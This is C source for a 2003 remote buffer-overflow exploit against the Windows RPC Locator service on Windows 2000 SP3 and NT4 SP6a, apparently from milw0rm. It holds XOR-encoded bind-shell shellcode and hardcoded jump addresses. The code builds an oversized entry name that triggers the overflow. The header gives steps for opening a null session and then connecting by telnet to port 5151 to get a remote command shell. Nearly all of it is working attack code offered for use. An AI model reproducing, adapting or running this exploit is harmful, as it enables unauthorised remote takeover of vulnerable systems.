/****************************************************************************
rpcexp.c
RPC LOCATOR Exploit
Autor: Marcin Wolak
mail: mwolak11@wp.pl
Last update: 30 march 2003
****************************************************************************/

/*****************************************************************************
About Compilation:
What You need to compile rpcexp.c ?
1. MS Platform SDK (August SDK is sufficient).
2. Compilator (f.e. MS Visual C++ 6.0).
rpcns4.lib is needed for linking.
*****************************************************************************/

/*****************************************************************************
Usage (You want to exploit remote Windows 2000 system (w2khost) with running RPC
Locator Service):
1. Set registry values in Your workstation as below:
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\NameService\NetworkAddress = w2khost
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\NameService\ServerNetworkAddress = w2khost
2. Establish null session:
net use \\w2khost\ipc$ ""/u: ""
3. Run Exploit:
rpcexp.exe /os w2ksp3

If everything it's ok, rpcexp hangs in console window. You can go to second
cmd console, run telnet (on port 5151) and get cmd on w2khost - just run
on second console:

telnet w2khost 5151

WARNNING !
With this shellcode You can get remote cmd only once. Second attempt will
be rejected.

WARNNING !!
Currently only Windows 2000 Sp3 and Windows NT 4 Sp6a are exploitable with
rpcexp.

*****************************************************************************/

#define UNICODE
#define RPC_UNICODE_SUPPORTED

#define NT4SP6ABRD 0x42
#define W2KSP3BRD 0x142

#define NT4SP6AJMP 0x0147FBC4
#define W2KSP3JMP 0x0090F8F0

#define NT4SP6ALLA 0x77F137BD
#define NT4SP6AGPA 0x77F13FB3

#include <stdio.h>
#include <rpc.h>
#include <rpcnsi.h>


#define PURPOSE \
"RPC Locator exploit utility \n\
Autor: Marcin Wolak - march 2003 \n\
mail: mwolak@gazeta.pl \n\n\
Tested on:\n\n\
Windows 2000 SP3 \n\
Windows NT 4.0 SP6a \n\n\
Only for educational purposes !!!.\n\n\
Usage:\n\
rpcexp.exe /v  - to view rpcexp info.\n\
rpcexp.exe /os w2ksp3 - to exploit Windows 2000 Sp3.\n\
rpcexp.exe /os ntsp6a - to exploit Windows NT 4 Sp6a.\n"


char shellcode [] =
"\xEB\x13\x5F\xB9\xCF\x02\xCF\x02\xC1\xE9\x10\x57\x80\x37\x99\x47\xE2\xFA\x5F\xEB"
"\x05\xE8\xE8\xFF\xFF\xFF\x14\x2E\x42\x98\x99\x99\x14\x06\x59\x9B\x99\x99\xCF\x66"
"\x8A\xCE\x14\x06\x5D\x9B\x99\x99\x14\x26\x54\x9B\x99\x99\x10\x5B\x65\xA8\x50\x28"
"\x94\xD0\xA9\x59\x35\x1D\x59\xEC\x60\xCA\xCB\xC8\xCF\xCB\x66\x8A\x32\xC0\xC3\xC2"
"\x7B\x75\xC2\xCA\x14\x02\x59\x9B\x99\x99\xA9\x59\x35\x1D\x59\xEC\x60\xCF\x66\x8A"
"\x10\x5B\xC2\xCA\x14\x02\x5D\x9B\x99\x99\x65\xA8\x50\x28\x9E\xA9\x59\x35\x1D\x59"
"\xEC\x60\xCA\xCB\xC8\xCF\xCB\x66\x8A\x32\xC0\xC3\xC2\x7B\x75\xA8\x59\x2D\x9D\xC9"
"\x58\x71\x9D\xC9\x66\xCE\x55\x10\x5B\xC2\xCA\x14\x02\x25\x99\x99\x99\xA8\x50\x18"
"\x58\xC4\x9B\x99\x99\xC9\x13\x8A\x11\x89\xDA\xD9\x7B\x61\xC1\x14\x02\x15\x99\x99"
"\x99\xCA\xF1\x99\x99\x99\x99\xC9\xC9\xF1\x99\x99\x99\x99\xF1\x99\x99\x99\x99\x66"
"\xCE\x21\xC9\xF1\x99\x89\x99\x99\x66\xCE\x41\xC1\x72\x6D\x70\x9E\x9B\x99\x99\xC6"
"\xCE\x18\x5E\xD5\x99\x99\x99\x10\x67\x18\x5F\x16\x66\x66\x66\xC2\x18\x5A\x39\x99"
"\x99\x99\xCA\xF1\x9B\x9B\x99\x99\x66\xCE\x7D\xA8\x59\xC9\xD9\xC9\xD9\xC9\x66\xCE"
"\x71\x0A\xF1\x89\x99\x99\x99\xCF\xCA\x66\xCE\x75\xF1\x9B\x99\x99\x99\xCA\x66\xCE"
"\x69\xA8\x59\xCE\xC9\x29\x95\x32\xC1\x32\xD9\x32\xC6\xD1\xC9\xCE\xCF\x34\xCF\x66"
"\xCE\x25\xD1\xC9\xCE\x34\xCF\x34\xCF\x66\xCE\x25\xD1\x29\xDD\x10\x9E\xCE\x66\xCE"
"\x59\xA8\x59\x12\xDF\x6D\x10\xDE\xA5\x10\xDE\xD9\x12\x9F\x10\xDE\xA1\xA8\x59\xFF"
"\x21\x98\x98\x10\xDE\xB5\xCE\xCE\xA8\x59\xC9\xC9\xC9\xD9\xC9\xD1\xC9\xC9\x34\xCF"
"\xA8\x59\xC9\x66\xCE\x5D\x66\xEF\x69\x66\xCE\x79\x66\xEF\x65\x66\xCE\x79\xD1\xC9"
"\xC9\xCA\x66\xCE\x6D\x10\x5A\xA8\x59\x2D\x9D\xC9\x58\x71\x9D\xC9\x66\xCE\x55\x10"
"\x5F\xA8\x59\x10\x58\x2C\x9D\xC9\xC9\xCE\xC8\xCF\x66\xEE\x0A\x66\xCE\x51\x18\xA6"
"\x98\x99\x99\x99\xE5\xBC\xA8\x59\xC9\xCE\x66\xAE\xCF\x66\xEE\x0A\x66\xCE\x4D\x90"
"\x59\xED\x8D\xA8\x59\xC9\x66\xAE\xCF\xCA\x66\xCE\x61\xF1\xC9\x99\x99\x99\x66\xCE"
"\x41\x72\x5B\xA8\x59\xC9\x2D\x9D\xC9\xCF\xCA\x66\xCE\x65\xCE\xA8\x50\xC8\xC9\xCF"
"\x66\xEE\x0E\x66\xCE\x49\xF1\xC9\x99\x99\x99\x66\xCE\x41\x72\x38\xC9\x66\xCE\x45"
"\x09\xD2\xDC\xCB\xD7\xDC\xD5\xAA\xAB\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD"
"\x99\xDA\xEB\xFC\xF8\xED\xFC\xCD\xF1\xEB\xFC\xF8\xFD\x99\xDA\xEB\xFC\xF8\xED\xFC"
"\xC9\xF0\xE9\xFC\x99\xDE\xFC\xED\xCA\xED\xF8\xEB\xED\xEC\xE9\xD0\xF7\xFF\xF6\xD8"
"\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xC9\xFC\xFC\xF2"
"\xD7\xF8\xF4\xFC\xFD\xC9\xF0\xE9\xFC\x99\xDE\xF5\xF6\xFB\xF8\xF5\xD8\xF5\xF5\xF6"
"\xFA\x99\xCE\xEB\xF0\xED\xFC\xDF\xF0\xF5\xFC\x99\xCB\xFC\xF8\xFD\xDF\xF0\xF5\xFC"
"\x99\xCA\xF5\xFC\xFC\xE9\x99\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA\xFC\xEA\xEA\x99\xDA"
"\xF5\xF6\xEA\xFC\xD1\xF8\xF7\xFD\xF5\xFC\x99\xCE\xCA\xD6\xDA\xD2\xAA\xAB\x99\xCE"
"\xCA\xD8\xCA\xED\xF8\xEB\xED\xEC\xE9\x99\xEA\xF6\xFA\xF2\xFC\xED\x99\xFB\xF0\xF7"
"\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED\x99\xEA\xFC\xF7\xFD"
"\x99\xEB\xFC\xFA\xEF\x99\x9B\x99\x8D\x86\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99"
"\x99\x99\xFA\xF4\xFD\xB7\xFC\xE1\xFC\x99\xFD\x06\x71\xEE\x81\x02\x71\xEE\x71\x6D"
"\x64\x66\x66\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99";

void Usage(char * pszProgramName)
{
    fprintf(stderr, "%s", PURPOSE);
    exit(1);
}

void _CRTAPI1 main(int argc, char **argv)
{
	unsigned short mytab[2000];				// Exploit Buffer
    unsigned char * TmpEntryName  = NULL;		// Temporary Entry.
	unsigned long * EntryName  = NULL;
	unsigned long * TmpPtr  = NULL;
    unsigned short * pszStrBinding = NULL;
    RPC_NS_HANDLE hnsHandle;
    unsigned long NsSntxType = RPC_C_NS_SYNTAX_DEFAULT;
    RPC_STATUS status;
    short fSuccess = 0;
    short fContinue = 1;
    unsigned long i,k;

	unsigned long * PtrLLA = (unsigned long*) &shellcode[730];
	unsigned long * PtrGPA = (unsigned long*) &shellcode[734];
	unsigned long JMP = W2KSP3JMP;
	unsigned long BORDER = W2KSP3BRD;

	switch(argc){
		case 2:
			if((strlen(argv[1]) == 2) && (!strcmp(argv[1],"/v")))
				Usage(argv[0]);
			else
				printf("Bad arguments !!!\n");
			exit(2);
		case 3:
			if((strlen(argv[1]) == 3) && (strlen(argv[2]) == 6) &&
			   (!strcmp(argv[1],"/os")) && (!strcmp(argv[2],"w2ksp3")))
			   break;
			if((strlen(argv[1]) == 3) && (strlen(argv[2]) == 6) &&
			   (!strcmp(argv[1],"/os")) && (!strcmp(argv[2],"ntsp6a")))
			{
				(*PtrLLA) = NT4SP6ALLA ^ 0x99999999;
				(*PtrGPA) = NT4SP6AGPA ^ 0x99999999;
				JMP = NT4SP6AJMP;
				BORDER = NT4SP6ABRD;
			    break;
			}
		default:
			Usage(argv[0]);

	}

	EntryName = (unsigned long *) mytab;
	TmpEntryName = (unsigned char *) mytab;
	TmpEntryName[0] = '/';
	TmpEntryName[1] = 0;
	TmpEntryName[2] = '.';
	TmpEntryName[3] = 0;
	TmpEntryName[4] = ':';
	TmpEntryName[5] = 0;
	TmpEntryName[6] = '/';
	TmpEntryName[7] = 0;
	for (i=2;i<768;i++)
	{
		if(i <= BORDER)
			EntryName[i] = JMP;
		if(i == BORDER)
		{
			TmpPtr = (unsigned long*) shellcode;
			for(k = 0;k < 190;k++)
				EntryName[i+k] = TmpPtr[k];
			i += 189;
		}
		if(i > BORDER)
			EntryName[i] = JMP;
	}
	EntryName[768] = 0;

	  RpcTryExcept {
		  status = RpcNsBindingLookupBegin(NsSntxType,
                                         (unsigned short *) EntryName,
                                         0,
                                         NULL,
							0,
							&hnsHandle);
		  printf("RpcNsBindingLookupBegin returned 0x%x\n", status);
	  }
	  RpcExcept(1){
		  printf("RPC Runtime raised exception 0x%x\n", RpcExceptionCode());
	  }
	  RpcEndExcept
} /*End of Main*/

// milw0rm.com [2003-04-03]
            